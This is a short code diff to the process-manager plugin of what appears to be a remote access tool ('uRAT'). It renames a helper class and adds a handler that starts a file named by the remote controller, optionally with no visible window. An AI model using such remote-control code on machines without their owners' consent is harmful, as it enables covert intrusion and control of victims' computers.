@@ -17,14 +17,23 @@ namespace uRAT.ManagersClientPlugin.ProcessManager.Operations
         {
             if (packet is RefreshProcessesPacket)
             {
-                foreach (var proc in ProcessesHelper.GetRunningProcesses())
+                foreach (var proc in ProcessHelper.GetRunningProcesses())
                 {
                     SendPacket(new ProcessInformationPacket(proc.ProcessName, proc.Pid, proc.IsThis, proc.MemUsage));
                 }
             } 
             else if (packet is KillProcessPacket)
             {
-                ProcessesHelper.KillProcessByPid((packet as KillProcessPacket).Pid);
+                ProcessHelper.KillProcessByPid((packet as KillProcessPacket).Pid);
+            }
+            else if (packet is StartProcessPacket)
+            {
+                var startProcPacket = packet as StartProcessPacket;
+                ProcessHelper.StartProcess(new ProcessHelper.StartProcessOptions
+                {
+                    Filename = startProcPacket.Filename,
+                    NoWindow = startProcPacket.NoWindow
+                });
             }
             
         }
